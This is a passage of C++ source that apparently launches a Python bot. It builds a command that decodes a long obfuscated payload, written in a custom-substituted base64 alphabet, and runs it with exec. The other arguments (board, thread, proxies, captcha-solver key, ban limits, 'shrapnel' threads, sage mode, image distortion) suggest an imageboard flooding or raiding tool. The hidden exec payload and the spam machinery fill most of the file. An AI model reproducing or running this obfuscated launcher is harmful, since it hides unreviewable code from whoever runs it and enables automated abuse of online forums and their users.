gQV gK\"NoPjAAW OKUU@tQU@o\\BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"SoPjAAW OKUU@tQU@o\\UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"[oPjAAW OKUU@tQU@o\\jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"boPjAAW OKUU@tQU@o\\{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"loPjAAW OKUU@tQU@o`BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"poPjAAW OKUU@tQU@o`UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"uoPjAAW OKUU@tQU@o`jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"yoPjAAW OKUU@tQU@o`{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\" oPjAAW OKUU@tQU@oaBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"$oPjAAW OKUU@tQU@oaUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"(oPjAAW OKUU@tQU@oajbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#@oPjAAW OKUU@tQU@oa{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#DoPjAAW OKUU@tQU@obBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#NoPjAAW OKUU@tQU@obUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#SoPjAAW OKUU@tQU@objbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#WoPjAAW OKUU@tQU@ob{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#[oPjAAW OKUU@tQU@ocBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#boPjAAW OKUU@tQU@ocUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#goPjAAW OKUU@tQU@ocjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#loPjAAW OKUU@tQU@oc{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#poPjAAW OKUU@tQU@odBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#uoPjAAW OKUU@tQU@odUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#yoPjAAW OKUU@tQU@odjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK|DoPjAAW OKUU@tQU@oL{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|NoPjAAW OKUU@tQU@oM{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|goPjAAW OKUU@tQU@oQUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!zwK|pgSXOCUWlgL| gK!zwKypLBZKmcIX{ajAAW OKUSpLcIK%PgpKbGF cGX{aj@)JGJoUovP\\ !XbI\\LT )$ZFzIaZcbZIzy\\\"O`XG%OXncoVXXyclKxXIvlXoANSmmvcnKILZvkSlDg[FliaWKoaZFiYlF$[n)V\\\"JkaZzB\\\"!z[XqAdGKxW\"ckT\"m\'ZFz\\TnzgYUXxSncvbYF`SZija!Oo[FlpVDK\\aZ\\jT{m\'[ KAd!uoBgmka\"TmJC g[jboBgpK[nmw[ZJgQUAxbGXwLBc#`ZAmbj%mdGWoMBc{[jbqBgml[ZTiJC g[nmw[ZJwbnXi\\BgqBgmj`Y%ibj%kaG)|\\SpLBZAxb{@)JGTicGDw\\nmw\\Biy[ZT \\ZKwLSpK\\n){JIKxc{AqajA{[Y%o\\UgzOBl&BglK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtN|WyNF LBSmya#NgL| gN|WyO@pK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtNkbzNm LBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK\"F|[\"mqK{lLBYOx\\GWgQUA a FVS mKLGOx\\GWqBgmka\"TmJC g[k[ \\GXka\"TmLGOx\\GWqBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK#X \\j $K{lLBgmmdGXkLGOx\\GWqBgqmdGOmbISgTZik\\ZA `Y)wPgpKbIKqaoSpJnF{\\YzqcnWga\"Kxb#KiaIO%[UJqBgmqaoA!cBgqBg88");
    command += "\'); exec(code.decode('utf-8'))\" ";
//    string command("python3 main.py ");

    command += (board + " " + thread + " " + chaos + " " + potocksCount + " ");
    command += logMode;

    command += (" " + solver + " ");
    if (!hasKey || key == "") command += "0 ";
    else command += (key + " ");
    command += (proxyRepeatsCount + " " + mode + " ");

    if (!hasMinBan) command += "-1 ";
    else command += (minBan + " ");
    if (!hasMaxBan) command += "-1 ";
    else command += (maxBan + " ");

    if (!hasTriggerForm) command += "-1 ";
    else command += (triggerForm + " ");

    if (!hasShrapnelCharge) command += "0 ";
    else command += (shrapnelCharge + " ");
    if (!hasMinPostsCount) command += "-1 ";
    else command += (minPostsCount + " ");

    if (!hasMediaKind) command += "0";
    else command += mediaKind;
    command += " ";
    if (!hasMediaGroup) command += ". ";
    else command += (mediaGroup + " ");
    if (!hasMediasCount) command += "-1 ";
    else command += (mediasCount + " ");

    command += sageMode;

    command += (" " + to_string(shackalPower) + " ");
    if (shackalColor) command += "1 ";
    else command += "0 ";
    if (shackalAffine) command += "1 ";
    else command += "0 ";
    if (toPNG) command += "1 ";
    else command += "0 ";

    if (hasShrapnelCharge && !hasMinPostsCount)
        for (unsigned int i(0); i < shrapnelThreads.size(); i++)
            command += (" " + shrapnelThreads[i]);

//    cout << command << endl << endl << endl << endl;
    return command;
}

string Setup::decode(const string &base64DKOTI) {
    string ASCII("");

    for (unsigned long pos(0); pos < base64DKOTI.length(); pos++) {
        if (base64DKOTI[pos] == ' ') ASCII.append("0");
        else if (base64DKOTI[pos] == '!') ASCII.append("1");
        else if (base64DKOTI[pos] == '\"') ASCII.append("2");
        else if (base64DKOTI[pos] == '#') ASCII.append("3");
        else if (base64DKOTI[pos] == '$') ASCII.append("4");
        else if (base64DKOTI[pos] == '%') ASCII.append("5");
        else if (base64DKOTI[pos] == '&') ASCII.append("6");
        else if (base64DKOTI[pos] == '\'') ASCII.append("7");
        else if (base64DKOTI[pos] == '(') ASCII.append("8");
        else if (base64DKOTI[pos] == ')') ASCII.append("9");
        else if (base64DKOTI[pos] == '@') ASCII.append("A");
        else if (base64DKOTI[pos] == 'A') ASCII.append("B");
        else if (base64DKOTI[pos] == 'B') ASCII.append("C");
        else if (base64DKOTI[pos] == 'C') ASCII.append("D");
        else if (base64DKOTI[pos] == 'D') ASCII.append("E");
        else if (base64DKOTI[pos] == 'F') ASCII.append("F");
        else if (base64DKOTI[pos] == 'G') ASCII.append("G");
        else if (base64DKOTI[pos] == 'I') ASCII.append("H");
        else if (base64DKOTI[pos] == 'J') ASCII.append("I");
        else if (base64DKOTI[pos] == 'K') ASCII.append("J");
        else if (base64DKOTI[pos] == 'L') ASCII.append("K");
        else if (base64DKOTI[pos] == 'M') ASCII.append("L");
        else if (base64DKOTI[pos] == 'N') ASCII.append("M");
        else if (base64DKOTI[pos] == 'O') ASCII.append("N");
        else if (base64DKOTI[pos] == 'P') ASCII.append("O");
        else if (base64DKOTI[pos] == 'Q') ASCII.append("P");
        else if (base64DKOTI[pos] == 'S') ASCII.append("Q");
        else if (base64DKOTI[pos] == 'T') ASCII.append("R");
        else if (base64DKOTI[pos] == 'U') ASCII.append("S");
        else if (base64DKOTI[pos] == 'V') ASCII.append("T");
        else if (base64DKOTI[pos] == 'W') ASCII.append("U");
        else if (base64DKOTI[pos] == 'X') ASCII.append("V");
        else if (base64DKOTI[pos] == 'Y') ASCII.append("W");
        else if (base64DKOTI[pos] == 'Z') ASCII.append("X");
        else if (base64DKOTI[pos] == '[') ASCII.append("Y");
        else if (base64DKOTI[pos] == '\\') ASCII.append("Z");
        else if (base64DKOTI[pos] == '`') ASCII.append("a");
        else if (base64DKOTI[pos] == 'a') ASCII.append("b");
        else if (base64DKOTI[pos] == 'b') ASCII.append("c");
        else if (base64DKOTI[pos] == 'c') ASCII.append("d");
        else if (base64DKOTI[pos] == 'd') ASCII.append("e");
        else if (base64DKOTI[pos] == 'f') ASCII.append("f");
        else if (base64DKOTI[pos] == 'g') ASCII.append("g");
        else if (base64DKOTI[pos] == 'i') ASCII.append("h");
        else if (base64DKOTI[pos] == 'j') ASCII.append("i");
        else if (base64DKOTI[pos] == 'k') ASCII.append("j");
        else if (base64DKOTI[pos] == 'l') ASCII.append("k");
        else if (base64DKOTI[pos] == 'm') ASCII.append("l");
        else if (base64DKOTI[pos] == 'n') ASCII.append("m");
        else if (base64DKOTI[pos] == 'o') ASCII.append("n");
        else if (base64DKOTI[pos] == 'p') ASCII.append("o");
        else if (base64DKOTI[pos] == 'q') ASCII.append("p");
        else if (base64DKOTI[pos] == 's') ASCII.append("q");
        else if (base64DKOTI[pos] == 't') ASCII.append("r");
        else if (base64DKOTI[pos] == 'u') ASCII.append("s");
        else if (base64DKOTI[pos] == 'v') ASCII.append("t");
        else if (base64DKOTI[pos] == 'w') ASCII.append("u");
        else if (base64DKOTI[pos] == 'x') ASCII.append("v");
        else if (base64DKOTI[pos] == 'y') ASCII.append("w");
        else if (base64DKOTI[pos] == 'z') ASCII.append("x");
        else if (base64DKOTI[pos] == '{') ASCII.append("y");
        else if (base64DKOTI[pos] == '|') ASCII.append("z");
        else if (base64DKOTI[pos] == '1') ASCII.append("+");
        else if (base64DKOTI[pos] == '3') ASCII.append("/");
        else if (base64DKOTI[pos] == '8') ASCII.append("=");
    }

    return ASCII;
}
